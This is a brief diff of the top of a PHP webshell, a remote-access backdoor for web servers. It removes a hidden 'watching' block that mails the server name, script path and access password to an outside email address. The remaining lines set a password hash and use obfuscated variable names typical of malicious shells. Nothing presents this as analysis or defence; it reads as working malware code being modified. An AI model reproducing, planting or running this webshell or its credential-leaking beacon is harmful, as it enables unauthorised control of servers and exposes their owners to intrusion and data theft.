@@ -1,8 +1,4 @@
 <?php
-//--------------Watching webshell!--------------
-if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
-}
 //-----------------Password---------------------
 $▛ = "34df534db663da8ee9e0c05372e14841";
 $▘ = true;
